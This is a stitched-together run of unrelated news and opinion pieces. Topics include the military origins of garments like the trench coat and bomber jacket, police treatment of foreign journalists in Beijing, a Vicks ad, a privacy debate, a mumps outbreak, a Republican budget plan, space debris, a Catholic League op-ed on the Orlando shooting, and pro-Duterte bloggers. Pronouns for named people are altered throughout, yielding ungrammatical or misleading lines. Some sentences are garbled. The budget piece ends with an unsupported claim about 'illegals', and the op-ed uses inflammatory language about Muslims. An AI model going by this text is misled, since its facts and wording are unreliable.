No other item of outerwear embodies heritage British style as much as the trench coat. While the piece has become synonymous with the Burberry brand, the roots are debatable and include another label, Aquascutum. For the latter, the history goes back to 1853, when the company produced practical coats for officers fighting in the Crimean War using its patented waterproof wool. For Burberry, Thomas Burberry entered a design to the War Office in 1901 for an officer's raincoat made using their very own patented cotton gabardine fabric and featuring large lapels, convertible collar and epaulets.
Cardigan Sweaters
The name “Cardigan” is attributed to James Brudenell, 7th Earl of Cardigan and British Army Major General, who led the Charge of the Light Brigade at the Battle of Balaclava during the Crimean War (which as you may have guessed it, also birthed the creation of the balaclava – a town near Sevastopol in Crimea). From a fashion perspective, 17th century fishermen in France and the British Isles are said to be the early adopters of heavy knits which could withstand blustery conditions, but still retained a regal silhouette inspired by the British waistcoat.
Dr. Martens
Designed by Klaus Martens – a German doctor in World War II who was on leave from the army due to an ankle injury suffered while skiing in the Bavarian Alps – who noticed that their bum foot needed extra comfort that their military-issue boots couldn't provide. After tinkering with softer leather and cushioned soles, their partnership with Dr. Herbert Funck may best be remembered for counterculture connotations, but their roots were indeed authoritative in the company's infancy.
Camouflage
The word camouflage is said to have originated from the Parisian slang term camoufler (meaning “to disguise”) after the French army began employing artists to paint their artillery and observation posts in the now ubiquitous pattern, instead of their more traditional white gloved and pantalons rouges attire in World War I. In a 1917 Op-Ed in The New York Times pertaining to the relatively new practice of camouflaging oneself, they offered, “It is a wonderful opportunity, this game of hokus-pokus.”
Pea Coats
The “pea” in pea coat is derived from the Dutch word “pije,”which refers to the type of cloth used – a coarse kind of twilled blue cloth fabric with a nap on one side, first made popular in the 16th century and favored by the Dutch who were a naval power. It was aesthetically pleasing, but durable and warm thanks to the double-breasted nature of the construction, large lapels and vertical pockets. The coat was quickly mimicked and modified slightly according to the amount of wool needed, depending on the region where one was sailing.
Bomber Jackets
During World War I most airplanes didn't have enclosed cockpits, so the daring sharpshooters of the sky had to be outfitted with coats suitable of the high-speed and icy climates at altitude. While the Royal Flying Corps – the air arm of the British Army – favored long leather coats, the U.S. Army established the Aviation Clothing Board in September 1917 and began distributing heavy-duty leather flight jackets. They featured high wraparound collars, zipper closures with wind flaps, snug cuffs, and waists, which we now equate with the instantly recognizable bomber. According to Midwest Vintage, “In the early 1930's, years before WWII, the U.S. Air Corp was issued the A2 Bomber Jacket and it became standard issue in 1931. These jackets were made of seal skin leather and cotton lining. However, as the requirement for these jackets grew, supplying seal skin was considered impractical. The department of war went on to start making the Type A2 Bomber Jacket out of horsehide which at that time was plentiful. The A2 was a waist length leather jacket that featured two front patch pockets, and webbing attached to the bottom of the jacket and at the end of the sleeves to close out the air in addition to shoulder epaulets.”
The White T-Shirt
The white T-shirt was officially designated as a part of the U.S. Naval uniform in 1913, as a means to both beat the heat in tropical climates and aboard submarines, and to avoid soiling their uniform while doing dirty jobs.
Fishtail Parka
The concept of the fishtail parka design was to offer flexible protection during extreme cold weather through the detachability of all parts, with the “fishtail” designed to be tied around the legs for extra insulation. Used by U.S. troops during the Korean War, the M51 (named after the year it was put into mass production) was the result of previous attempts to create the perfect version of the coat during WWII, such as the OD-7 and the M-4. Needing to be warm but not cumbersome due to the wet climate they were encountering, the resulting waterproof nylon and cotton construction certainly did the trick.
The Wellington Boot
While the Duke of Wellington instructed a shoemaker, Hoby of St. James' Street, to make modifications to their 18th-century Hessian boots, production of the “Wellington” was dramatically boosted during World War I due to the flooded trenches in Europe and the need for a boot that would be suitable for the conditions. Crafted out of technology invented by Charles Goodyear, who had managed to understand the vulcanization process for natural rubber, (instead of employing knee-high leather like the earliest versions) the success of the prototypes in keeping soldier's feet dry resulted in 1,185,036 pairs being made to meet the British Army's demands.
Desert Boots
The Clarks Desert Boot was designed in 1949 by Nathan Clark and launched at the Chicago Shoe Fair a year later. While they were stationed in Burma as an officer in the Royal Army Service Corps in 1941, they couldn't help but notice the shoes favored by off-duty Eighth Army officers, who were keen on crepe-soled boots made from rough suede from Cairo's fabled Old Bazaar, and which performed well in the arid climate. While other pieces of footwear with military influences relied on their rugged versatility, the birth of the Desert Boot was distinct in that it drew from “off-duty” sensibilities.
Cargo Pants
According to Ben Grant of the University of Oxford, “Cargo pants were first worn in 1938 by British military personnel. These cargo pants were part of their Battle Dress Uniforms (BDU). The original cargo pant style featured one pocket on the side thigh and one on the front hip. Cargo pants were first worn in the United States on military uniforms in the 1940s. The side cargo pockets initially were only on paratroopers' uniforms, providing them with easy access to ammunition and radios.”
The Cartier Tank Watch
Louis Cartier created the Tank watch in 1917 and presented the prototype as a gift to General Pershing – an officer in the United States Army who led the American Expeditionary Forces in World War I – some years before the watch was introduced into the market in 1919. Designed after the modernistic Renault tank, the watch's brancards are undoubtedly like the parallel treads of a tank, making it “the first elegant wristwatch destined for the modern man of action.”

The ambassador has now issued a statement strongly condemning the detention and harassment by police of several foreign journalists who tried to cover the response to another call for protest, this time on February 27th. One of the journalists was punched and kicked, by people who appeared to be plainclothes police, and then detained for several hours. Several reporters had their cameras and video equipment confiscated. A report by the Foreign Correspondents' Club of China (which has since been removed from the club's website) counts 16 news organisations whose staff were harassed by police: either assaulted, manhandled, deprived of their equipment or detained. Mr Huntsman called on the Chinese government to “hold the perpetrators accountable”.

Chinese officials have accused the foreign media of overreacting to the attempt at a protest; a handful of ordinary citizens did appear to respond to the call in Beijing and Shanghai, but only a handful. They were quickly taken away by police and were at all times outnumbered by journalists. But the police response suggests a kind of worry on the part of the officials: they seem to be profoundly concerned about the country's vulnerability to large-scale upheaval. The massive security deployments on February 20th and 27th, and the accompanying detention and surveillance of dissidents, indicates they feared a real possibility of serious unrest. They pulled out all the stops to cow the government's critics into silence.
In Beijing this has included measures directed at the foreign media that are reminiscent of the dark days that followed the bloody suppression of the Tiananmen Square protests in 1989. Todd Carrel, a reporter for ABC news, suffered serious and lasting injury at the hands of plainclothes thugs on the square in 1992, while covering the anniversary of the crackdown. In the buildup to last weekend, numerous foreign correspondents were given warnings by the police that they would need official clearance to report in either Wangfujing, ordinarily a busy shopping street, or Tiananmen. Although officials have often insisted on clearance to conduct journalistic activities on Tiananmen, the extension of such restrictions to Wangfujing was new.
In many cases the police insisted that journalists visit them at an office building to receive these warnings. One colleague was told that they had to turn up at the building on Sunday afternoon, just when the protest was due to happen. When they said this was not convenient, they were told there might be future difficulties with their visa if they did not comply.
The security in Wangfujing that afternoon was extraordinary. I walked up the length of the broad pedestrian street and saw as many plainclothesmen and uniformed police as I did shoppers. Two police officers stood at the ready with attack dogs. I saw one foreigner being escorted away by police and others being stopped to ask for their identity papers. Later, say reports, water was sprayed over the street in what appeared to be a deliberate attempt to scatter anyone who might linger. Civilians in red armbands, a sort of unarmed militia who are often mobilised to assist police with major security operations, such as during Beijing's Olympic games in 2008, were out in force on Wangfujing and streets leading into it. Any attempt at protest would not have lasted a minute under such scrutiny.
The government is always edgy as it prepares for the annual session of the country's legislature, which begins this year on March 5th. But as security precautions as far afield as Kashgar suggest, it is more than usually nervous this time. Copies of The Economist on sale in Beijing had last week's Banyan column (about China in the context of the Arab world's turmoil) ripped out by censors. CNN's reports on the upheaval are often blacked out. Even Mr Huntsman's name has become a blocked search term in China.
China's prime minister, Wen Jiabao, in what might have been partly an attempt to assuage any would-be revolutionaries, promised in an online “chat” on Sunday (hours before the called-for protest in Wangfujing) that the government would continue efforts to tame inflation. Rapid increases in house prices have been causing strong resentment among those not yet on the housing ladder. “I only have two years left for my tenure of office. I think the work in the two years will be not at all easier than that in the previous eight years, but will be much tougher instead”, said Mr Wen. Certainly China's police are braced for trouble.

This commercial is redefining India's traditional family.
The touching short film above, which Procter & Gamble's Vicks created, tells the true story of a young orphan in India named Gayatri who was adopted by 37-year-old Gauri Sawant, a transgender woman and social activist who lives in Mumbai.
On the way to boarding school, Gayatri recounts their life, their adoption and meeting their new mother, Sawant, for the very first time. Gayatri says that their mother sends them to boarding school so they can one day be a doctor. But Gayatri says they want to be a lawyer instead, so they can fight for the rights of people who are like them mom.
“My civics book says that everyone is entitled to basic rights,” Gayatri says. “Then why is my mom denied them?”
In 2014, India legally recognized transgender people ― known in the country as “enunchs” or the “third gender” ― but the marginalized community still has to fight for basic rights, including the right to legally adopt a child.
Many transgender women like Sawant work around the law by informally adopting the orphans of sex workers who are unable to take care of their own children.
Sawant saved Gayatri from being trafficked into the sex industry in Kolkata after the young girl's mom, who was a sex worker, died of AIDS, according to the Mumai Mirror. Since Sawant's own family had rejected their decision to live as their authentic self years earlier, they had to raise Gayatri all on their own.
People would often look down on Sawant because they were raising a child as a transgender woman, they told the Mumbai Mirror. Still, they proudly carried on as a parent.
“I don't feel special,” Sawant said. “I became a mother because of Gayatri and they are my pillar of strength. I did what every mother does.”
Gaytari and Sawant's emotional story was turned into an ad for P&G's “Touch of Care” campaign in an effort to raise awareness of the issues Sawant and other transgender women in India face.
“Vicks has always been about the gentle touch of a mother's care, as they caress and gives relief to their child,” P&G executive Nitin Darbari said in a statement.
With the campaign, “we are going a step further and expounding the importance of care beyond just the traditional perception of family,” Darbari added. “The campaign shows how people who, though not connected by blood, end up being family through care itself.”
And Sawant was the perfect spokesperson for the cause.
Like everything in life, there is a plethora of varying opinions when it comes to protecting privacy, freedom and civil liberties. Even when just looking among different privacy advocates, it's painfully clear that not everyone agrees. While I'm personally not a fan of finger-pointing or name-calling, and I do not know either of these authors concerned with privacy, there are bits and bytes from each that are worth pondering.
Author David Brin gave a keynote at the International Association of Privacy Professionals (IAPP) Global Privacy Summit. As IAPP explained, Brin's keynote message about Big Brother included:
We're in an age of a technological tsunami. Here in the West, we're faced with two opposing ideologies: On the left, we believe Big Brother is descending upon us via an oligarchy of faceless corporations. On the right, we believe Big Brother is descending upon us via “snooty academics and faceless bureaucrats.” The result? A civil war that has completely destroyed our political world. And the only thing that will save us is a fierce militancy that sees the watched becoming the watchers.
After Brinn made their points, they concluded, “Think in terms of how we might reclaim and seize the power to supervise, to be the aggressive citizenry we were born to be, to be worthy of our ancestors who did this exact thing every time we moved to the next stage, so that we're the ones who ride upon this tsunami into the future.”
In May, at the IAPP Symposium, author Peter Watts spoke about “The Scorched Earth Society: A Suicide Bomber's Guide to Online Privacy” (pdf). They suggested, “Here's a wild thought: Don't just offer data protection, especially since you can't guarantee it. Offer data destruction instead....A scorched-earth society." When Watts spoke, they also apparently took issue with some of Brin's ideas.
Later Brin took issue with some of Watts' “Scorched Earth” talk, by asking:
Seriously, find me one time and place where blithe assurances of data-leakproofing or data-destruction proved reliable, across thirty years. Or ever. You want to base your freedom on assurances that you can "destroy" data? Do you trust any "Delete" command to reliably and actually "burn to the ground" any single thing that was ever turned into bits and transmitted across fiber or wires or through the air?
A few days ago Watts wrote about Liquid Surveillance, a term borrowed from law professor Neil Richards' paper titled The Dangers of Surveillance. In it, Richards tackled the legal problems of surveillance law and making the courts understand why surveillance is harmful.
Be warned that if you read Watts' Liquid Surveillance post, there's plenty of profanity; by the time you get to the comment section, it's a regular mudslinging bashfest. The parts about people being “whiners” when it comes to privacy had me frowning. Most any stance is better than the ridiculous “nothing to hide” justification.
Watts agrees that Brin is right when they say “If the watchers watch us, we should damn well be able to watch them in turn.” They disagree, however, “that both sides will ever have comparable eyesight, that an army of cellphone-wielding Brave Citizens (as opposed to the rest of us moaning whiners) is enough to level the playing field.”
Something both men agree upon is the right to privacy in our homes. Watts wrote:
Take a Man's Castle, for starters. Even Brin draws the line at domestic privacy: their Transparent Society ends on our doorsteps, explicitly allowing that our homes, at least, will remain unsurveilled. It may have seemed a plausible extrapolation back in the nineties, before Moore's Law and Surveillance Creep produced such a litter of unholy love-children: the television in your bedroom that reports your viewing habits and the contents of your thumb drives back to corporate headquarters. The back doors built into every Windows operating system from XP on up. The webcam that counts the people in your living room, so that it can shut down your TV if it sees four faces when your subscription to Game of Thrones is only licensed for three. And of course the government, lurking overhead like a rain-swollen overcast sky, turning all of corporate America into its b*tch with a wink and a National Security Letter (and even an actual warrant on rare occasions). The Internet of Things has barely even got off the ground, and these are only a few of the intrusions we're already facing.
At any rate, if you are interested in an intense – and sometimes even an excruciating – debate about privacy, then you might want to check out both posts, Brin's Brave Citizenship beats a Scorched Earth Policy and Watts' Liquid Surveillance. They definitely provide food for thought.
Both men make some valid points, but perhaps you would totally agree with just one or the other? Perhaps anything, even a flame war, that gets a discussion going about privacy, civil liberties and surveillance is a good thing? Yet as both a privacy advocate and a mom, there's an urge to ask the boys, “Can't we all just get along?”…and then perhaps add, “You are both grounded!” Relax boys, I'm joking.
ALBANY, NY (NEWS10) - The Albany County Department of Health confirms 3 UAlbany students have Mumps.
The school says they remain isolated from campus until they're no longer contagious.
"Everybody should be concerned about it," said UAlbany Sophomore Nicole Phillips.
That's how Nicole Phillips feels after learning three of their peers at UAlbany have Mumps.
"It's kind of scary because you don't know like, like say you're in a relationship with someone and say they have it," said Phillips.
But many students don't feel the same, for one reason.
"I'm not alarmed about it because I'm vaccinated," said UAlbany Senior Kevin Howard.
Most people get a Measles, Mumps, and Rubella or MMR vaccine between 12 and 15 months of age. It's now recommended to get a second dose before kindergarten. These vaccinations are usually required for schooling.
But there's something you may not know. Dr. Jim Saperstone says the Mumps portion of MMR is only 80 to 90 percent effective, even if you received two vaccines. That doesn't help in a dorm situation.
"Where there are lots of kids together and they're crowding and they're not taking care of themselves and the windows aren't open, you can get little outbreaks," said Saperstone.
The viral disease is spread through saliva or mucus. Symptoms usually appear in 16 to 18 days after exposure. Those include fever, aches and swollen glands.
There's no treatment but complications are rare.
"Rest, fluids, ibuprofen, that's it," said Saperstone.
UAlbany says until May 16, people who have not provided proof of vaccine will not be allowed on campus for 26 days after the last case is diagnosed.
In the meantime, students are taking precaution.
"Washing my hands all the time, try not to touch my face or around my mouth or eyes," said UAlbany Junior Kimiko Bee.
"You have to just take care of yourself and I think you should be good," said Phillips.
UAlbany is working on holding a vaccination clinic on campus this week.
Big health cost shift to elderly in GOP plan
The CBO has come out with criticism over the Republican the new budget proposal. Under the plan, the CBO says that most future retirees would pay considerably more for health care. The fiscal blueprint calls for people now 54 and younger in a different kind of health care program when they retire, unlike the Medicare that their parents and grandparents have known. What they would get is a federal payment to buy private insurance from a choice of government-regulated plans.
“A typical beneficiary would spend more for health care under the proposal,” the nonpartisan Congressional Budget Office estimated in an analysis released late Tuesday.
Olympian
Over time, future retirees would pay much more, partly because the Medicare benefits package would be more expensive to deliver through private insurers. By 2030, the government payment would cover only about one-third of the typical retiree's total health care costs.
This plan introduced by House Budget Chairman Paul Ryan, R-Wis., would reduce total federal spending, deficits and debt, saving money for federal taxpayers. But it would be tempered by a cost shift to future retirees. Has anyone had time to study the plan, before commenting, as it has just been released?
Many say this could become a huge problem, politically, for Republicans. According to the budget office, the new GOP plan would leave most of those cuts in place. Although the Republicans want to push it quickly through the House, it will probably fail in the Senate. Ryan calls their Medicare idea Premium Support.
“The ball game in a premium support or voucher program is the level of support and how it is increased in the future, over time,” said Drew Altman, president of the nonpartisan Kaiser Family Foundation, an information clearinghouse on the health care system. “If it is not increased adequately, then seniors will pay more or get fewer benefits.”
Olympian
And other changes in Ryan's plan include:
Putting 30 million more on Obamacare would be repealed.
Medicaid, the federal-state program that covers low-income and severely disabled people, would be converted into a block grant program that gives each state a lump sum to design its own insurance plans. This would leave out many poor.
The coverage gap in the Medicare prescription drug benefit would be brought back.
Future retirees would see an increase in the eligibility age for Medicare, currently set at 65. Starting in 2022, the eligibility age would rise by two months each year until it reaches 67 in 2033.
In malpractice cases, the jury rewards would be limited. Now although Ryan's plan saves $5 trillion over 10 years, critics say it won't put much of dent in the deficit.
“What this plan tees up is a question about the role of government in our lives and in our health care system,” said Mike Leavitt, former Health and Human Services secretary under President George W. Bush. “It boils down to two questions: How much can we afford and what role government should play. The U.S. is really alone in the world when we say we can afford an unlimited amount for all individuals.”
Olympian
At the basic level, Ryan's plan would shift more of the risk from rising health care costs from federal taxpayers to individual beneficiaries, medical service providers and states, giving them all a powerful incentive to avoid waste and aim for quality and efficiency. Now both sides agree, this could keep costs down.
For seniors already in the program and people within 10 years of retirement, Medicare would remain in place largely as it is now. But by 2022, new beneficiaries no longer would have access the traditional program. Instead, they would get a fixed amount from the government to purchase private insurance.
The voucher would be adjusted so that if a person's health takes a turn for the worse, the federal payment would increase. Wealthier beneficiaries would get a lower subsidy, but lower-income seniors would get extra help with their out-of-pocket costs.
As for Medicaid, this would would mean that poor people no longer would have a right under federal law to get health care through Medicaid. Instead, Washington would send each state a lump sum to spend on medical care, nursing homes and other health services.
Advocates are worried that states will not be able to offer vulnerable low-income people reliable protection. Medicaid payments to providers are already at rock bottom levels. States pressed for money in a future economic downturn might reduce payments to doctors and hospitals even more, and they might even freeze enrollment.
That would send more people to the emergency room looking for charity care. We already have this, and to explain, this means booting off illegals who get healthcare free. That's the main contension, why so many are against this plan.

The recent uptick in solar flares and other activity on the sun could one day cripple satellites or knock out power grids on Earth. But in the meantime, the solar maelstrom has been helping to clear out space junk, NASA scientists report.
Right now some tens of millions of pieces of space junk are circling our planet—broken satellites, rocket parts, and other human-made materials trapped in orbit. That includes pieces from a Chinese probe that was destroyed during an anti-satellite missile test in 2007.
In the latest issue of NASA's Orbital Debris Quarterly News, agency scientist Nicholas Johnson notes that an increased influx of solar heat is causing Earth's upper atmosphere—specifically, a layer known as the thermosphere—to swell.
In turn, the puffed-up thermosphere has accelerated the rate at which the Chinese satellite debris is being removed from Earth's orbit, Johnson found. (Also see "NASA Satellite Falling Faster Due to Solar Activity.")
In general, "the increase in solar activity causes more energy to be deposited into the atmosphere, which in turn is heated and expands," explained Johnson, chief scientist of NASA's Orbital Debris Program Office at the Johnson Space Center in Houston.
"This increases atmospheric density at a given altitude, thereby increasing drag. This causes [orbiting space junk] to lose energy and fall into a lower orbit," where the debris eventually reenters the atmosphere, Johnson said in an email.
Space Junk Flushed Like Leaves From Gutters
In 2007 China deliberately destroyed its Fengyun-1C weather satellite to test anti-satellite technology. (Related photos: "Satellite Collision Creates Dangerous Debris.")
NASA estimates that about 6 percent of the 3,218 cataloged pieces of debris from Fengyun-1C have since reentered Earth's atmosphere.
Half of those objects were destroyed during the past year alone, which coincides neatly with a ramp up in the sun's activity as it enters the next anticipated solar maximum—when solar activity is at its peak—in 2013.
In total, more than a hundred metric tons of space junk have been destroyed in the past year. The majority of this debris would have reentered the atmosphere sooner or later—increased solar activity simply sped up the process, Johnson said.
"The more susceptible objects will fall out first, similar to flushing leaves from your house gutters," they said.
While most of the objects that fall from they sky are vaporized before they hit the ground, some pieces are large enough that they could survive reentry and pose threats.
"Last year," Johnson said, "there were 17 spacecraft and 8 rocket bodies which reentered in an uncontrolled manner, including two spacecraft and one rocket body from the 1960s."

The man responsible for the Orlando killings, we're told, was a devout Muslim who attended a mosque several times a week, brought a prayer rug to work, pledged their allegiance to ISIS, cheered the 9/11 massacre, traveled to Saudi Arabia, and was raised by their Taliban-loving father. Yet, despite all this reported evidence, Christians are being blamed for the killings.
There is no greater proof of why the Catholic League exists than this: Christians, especially Catholics, are typically held responsible for the sins of others, and this is doubly true when sexuality is implicated. Most troubling is the fact that the anti-Christian hate mongers are not just dopey bloggers—they are academics, lawyers, activists, and writers.
When it comes to Christian haters, few can top Jonathan Katz, a homosexual activist and University of Buffalo professor. Now they are deflecting attention from the role that ISIS played in the Muslim murders: they say the real culprits are Christians. In fact, they refer to the ISIS connection as merely the "ISIS thing," as if the Islamic State were only tangentially related to the killings.
"The ISIS thing is a distraction," Katz says, arguing that we should instead be "looking at the long legacy of anti-gay violence in this country that has itself been stoked and promoted by the Christian right." The central problem, they say, is not to be found in "the Middle East," but at home where the "homophobia problem" exists.
Katz has a history of bashing Christians for not embracing the gay agenda. In 2010, they objected to my criticism of a taxpayer-funded Smithsonian exhibition that featured a vile video of ants crawling all over the crucifix. For simply exercising my First Amendment right to free speech, Katz called me an "American Taliban." I reminded them that the Taliban puts gays in human shredders.
Slate writer Mark Joseph Stern is another homosexual activist who refuses to blame Islamists for what happened, opting to point the finger at Christians instead. The title of their screed tells it all, "How Conservative Christian Activists Spent Decades Fomenting Anti-Gay Hate in Orlando."
To make their point, Stern blames the Catholic League for cultivating gay hatred. How did we do this? By allegedly joining a boycott of Disney in 1996. They say we were angry about a Disney employment policy on gays. Stern is wrong. We didn't join any such effort. In 1995, I led a boycott of Disney because of its role in promoting an anti-Catholic movie, "Priest" (at that time Disney owned Miramax, the film's distributor).
Just as with Katz, Stern paints me as anti-gay for fighting anti-Catholicism. Moreover, they believe I laid the groundwork for Omar Mateen's killing spree. Why I haven't been arrested they do not say.
Katz, Stern, and others (Sally Kohn and the ACLU) are so driven by their hatred of Christianity that there is virtually nothing that Muslim barbarians can do that cannot be deconstructed to exculpate them and implicate Christians.
Adding to the crazy talk, and proving my point better than I could ever do, is Ben Brenkert. Like many other homosexual seminarians who never made it—he spent 10 years training to become a Jesuit priest—he has a score to settle with the Catholic Church.
Brenkert's article in the Daily Beast on the Orlando killings says absolutely nothing about Muslims, Islam, or ISIS, but it has plenty to say about the pope, and, of course, sex.
Pope Francis decried the killings but didn't single out homosexuals. For Brenkert, this signifies "the Church's lack of care of the whole gay person, including the identification of the gay victims when it matters most: in their martyrdom." For me, at least, this really is breaking news—I had no idea that the victims gave themselves up for a noble cause.
Following Katz and Stern, Brenkert exploits the Orlando killings to advance their sexual politics.  They are not interested in pressing the authorities to do a better job screening for prospective terrorists; rather, they seize this opportunity to register a complaint with the Catholic Church. Their whining is hard to beat. "Sexually active gay men who are Roman Catholic cannot receive Holy Communion at Mass," they say.
This is true. The same is true of sexually active single heterosexual men and women, as well as adulterers. But even if everyone could receive Communion, no matter the nature of the sin or the degree of contriteness, it strains credulity to assume that this has anything to do with the behavior of a Muslim maniac.
The purpose of this outburst of Christian bashing in the wake of the Orlando tragedy is to silence Christian dissent on matters sexual. Narcissistic to the bone, these gay activists will always give Islam a pass, and will always bash Christians. The issue for them is sex, not violence.

They ask President Duterte's spokesperson to resign after they said he'd explain to supporters how valuable critical journalism had been to the government and even to Duterte's electoral victory in 2016
Published 8:09 PM, November 06, 2017
MANILA, Philippines – The vitriol that rabid pro-Duterte bloggers usually reserve for the President's critics is now directed at Presidential Spokesman Harry Roque for siding with journalists on the issue of fair criticism.
Two of President Rodrigo Duterte's most fanatical online defenders, Thinking Pinoy account owner RJ Nieto and Sass Rogando Sasot, slammed Roque for "chickening out" in their threat to throw hollow blocks at Duterte critics, including journalists.
Nieto, within hours of Roque's remarks explaining the value of critical journalism, called their appointment a "big mistake" and asked them to resign.
"UMALIS KA DIYAN. AT HUWAG KA NANG UMASA SA 2019," said Nieto on Facebook. (Get out of there. And don't be hopeful about 2019.)
Nieto told the senior Malacañang official that they were a coward and "nothing like" the President.
"Nasaan ang bayag mo Spox, nag leave of absence ba?" said Nieto. (Where are your balls, Spox, did they take a leave of absence?)
Nieto said Roque has no right to "order" around pro-Duterte bloggers like himself.
"Sinabi mo pang dapat pagsabihan ang DDS? Hoy, wala kang kakayahang utusan ang mga supporter ng pangulo," wrote the blogger. (You even said DDS should be given a reminder? Hey, you can't order the supporters of the President around.)
Sasot, in a flurry of Facebook posts, called out Roque for defending journalists but not standing up for pro-Duterte bloggers.
"Now, the Spox. Roque is telling us to stop throwing anyting at a Rappler journalist! REALLY? You want us Spox Roque to stand silent as your friends at Rappler do this to us?" said Sasot in a Facebook post on Sunday, November 5.
Sasot's roughly 20 posts about the presidential spokesperson showed how nonplussed they were about Roque's remarks.
They blasted Roque for supposedly curtailing the freedom of speech of Duterte supporters while siding with their "legitimate media friends."
However, Roque never advocated the curtailment of freedom of speech of Duterte defenders.
In their interview with Malacañang reporters, they merely said they would explain to Duterte supporters how valuable critical journalism had been to the government and even to Duterte's electoral victory in 2016.
Roque is the first appointee of the President's to attract the ire of some of their rabid supporters.
Presidential Communications Assistant Secretary Mocha Uson also reacted to Roque's statements, but in a more restrained fashion. Uson asked their followers what they thought of Roque's remarks, before they meet with the spokesperson to discuss media rights.
In a text message to Malacañang reporters, Uson said they would tell Roque that journalists must also respect the opinion of Duterte online supporters.
Uson claimed that, unlike "Yellow trolls," Duterte supporters are not paid to be disruptive and to bash critics on social media. – Rappler.com

MANCHESTER — One New Jersey woman seems content to play hard ball with the young baseball player whose throw struck them at a Little League game, according to a report on Good Morning America.
Elizabeth Lloyd, of Manchester, is reportedly seeking $500,000 in damages after they were hit by a ball thrown by Matthew Migliaccio, now 13, in May 2010.
“It wasn't a hard throw, it was just a lob back to the pitcher and I guess it went about 10 feet over their head,” Migliaccio told GMA of the incident.
Lloyd was struck in the face by the ball.
Migliaccio told GMA they went over to them immediately.
“I went over to see if they were okay, and they said that they were fine and not to worry about it,” Migliaccio said.
Lloyd was reportedly hospitalized and underwent two surgeries to reconstruct their eye socket.
“About like three weeks after, they came and gave me a hug and they told me that it wasn't my fault,” Migliaccio told GMA.
Lloyd has since filed suit against the boy, alleging in court documents obtained by ABC News, they assaulted and battered her, calling the throw "intentional/reckless."
“I think it's pretty mean to sue someone after you told them that you knew it wasn't their fault,” Migliaccio told GMA of the lawsuit.
The boy's attorney, Anthony Pagano, said the lawsuit has no merit and that their client will not settle with the woman.
“What are we gonna do, take their bike? He's 11,” Pagano said.
Llloyd declined to speak to GMA, but in a statement their attorney said, "The consequences of that action are not as they have been portrayed. Them life has changed, they have a catastrophic injury which has been vastly understated."

A Crawley man is believed to have carried out a suicide bombing in Syria. They have been named by the BBC as 41-year-old Abdul Waheed Majid.
Sharing a message of peace, Mr Ahmedi said: “It's important for Muslim communities to share the values of the town and promote peace.”
Referring to their mosque, in Langley Drive, they added: “We make our youth loyal to the country in which we live and loyal to the town we live in and I think maybe that message is not coming loud and clear.
“And that is something the Muslim communities, the imams, the mosques should really work hard on and make youngsters feel loyal to the country.”
The Oregon bakers who shuttered their business after their decision to turn away two lesbian brides-to-be created a national controversy are speaking out.
Sweet Cakes by Melissa co-owners Aaron and Melissa Klein told the Christian Broadcasting Network (CBN) that lesbian, gay, bisexual and transgender (LGBT) rights advocates used "militant, mafia-style tactics" to shut down the business.
"I didn't want to be a part of their marriage -- which I think is wrong," Aaron told the news channel of their decision to turn away the lesbian couple earlier this year. Meanwhile, wife Melissa echoed those sentiments: "I am who I am ... I choose to serve God."
Though Sweet Cakes by Melissa reportedly saw an uptick in business after news of the controversy broke in January, the Kleins now tell CBN that the wedding cake division of their bakery suffered a major loss.
The shop's closing came on the heels of news that the lesbian couple that Klein rejected had filed a complaint with the state, alleging that Sweet Cakes by Melissa discriminated against them based on their sexual orientation, according to Oregon Live.
In response to the complaint, Melissa Klein argued that turning away the couple was "definitely not discrimination at all."

Whoa! Trader Joe's Just Released a New Vegan Entree Made With Jackfruit
Sarah Von Alt |
It's no secret that Trader Joe's offers loads of delicious plant-based products. From the wide variety of mouthwatering meat and dairy alternatives, like almond milk and meatless meatballs, to the gamut of ready-made meal options, like frozen vegan enchiladas and canned vegetarian chili, this store is packed with healthy, animal-free foods.
And now, the grocer is capitalizing on the growing popularity of jackfruit—a must-have vegetarian staple—with an exciting new frozen entree: Yellow Jackfruit Curry with Jasmine Rice!
Jackfruit vegan curry?! 😮 (📸: @peachyapplevegan). #vegan #traderjoes #traderjoesvegan #vegancommunity #govegan A post shared by Trader Joe's Vegan (@traderjoesvegan) on Nov 17, 2017 at 11:46pm PST
Trader Joe's describes the dish:
Yellow Jackfruit Curry with Jasmine Rice finds its texture in the chunks of artichoke-like jackfruit, chunks of eggplant and red bell peppers. This authentic coconut milk based Thai yellow curry is loaded with flavor and has a moderate amount of heat.
As veganism gains popularity, companies like Trader Joe's are taking advantage of the expanding plant-based food market. In fact, just last week TGI Fridays announced plans to offer the Beyond Burger at nearly 500 locations in the U.S., and Pizza Hut committed to offering vegan cheese at all of its U.K. locations.

Walt Disney's Disneyland presentation map has sold for $708,000 at an auction in Los Angeles.
Although it fell short of the $900,000 it was expected to fetch, it's still believed to be the most expensive Disneyland map ever sold but it's not been revealed who the buyer is. The highly anticipated Walt Disney's Disneyland auction was held by Van Eaton Galleries on June 25, 2017.
“As we had expected, this extraordinary Disneyland map sold for an outstanding price. After some pretty exciting bidding the map sold for $708,000,” said Mike Van Eaton, Co-Owner of Van Eaton Galleries. “We are beyond thrilled that the map will continue to be appreciated and cherished just like it has been for all these years.”
The original map, created by Walt Disney and Herb Ryman, was used to secure the initial funding for Disneyland in 1953. The auction featured nearly 1,000 other iconic, exceptional Disney artifacts.
For over 60 years, Disneyland has influenced popular culture and built generations of loyal fans. The auction was devoted to the history of Disneyland and featured rare and remarkable items from some of the finest collections in the world including Walt Disney's original 1953 Disneyland map.
A visionary and master showman, Walt Disney was inspired to build their theme park after spending time with their daughters at a local Los Angeles park and carousel. Every detail of every costume was part of the show and the storyline and Walt Disney spared nothing in creating some of the most magical costumes in theme park history. From the moment you enter the turn-of-the-century Main Street, a portal between the real world and the adventures yet to come, a guest could see the bright colors, fanciful designs and entertaining styles of every fashion woven into the Disneyland experience.
Fashion highlights at the auction included a rare Haunted Mansion hitchhiking ghost animatronic shirt, a Walt Disney World Railroad Conductor costume, Haunted Mansion costume, Indiana Jones Adventure female and male wardrobe designs, a Star Tours male costume, a Tiki Room cast member blouse and Walt Disney World Guest Relations costume among many other things.
Other highlights included an original ride vehicle from Autopia, an original model of Michael Jackson from the Captain EO attraction, an extremely rare poster from the Grand Opening of the Haunted Mansion attraction, a rare original poster from the Matterhorn Bobsleds attraction, a section of carpet from Walt Disney's apartment in Disneyland and an extremely rare opening-day Disneyland Guide Book signed by Walt Disney.
Also up for auction were vintage park souvenirs, original signs, contracts, magazines, and memorabilia from the earliest of days of the Disneyland Parks.
Chargers owner Dean Spanos has called at 8 a.m. PST meeting Thursday to tell their staff the news they have all been bracing for: The team will move to Los Angeles.
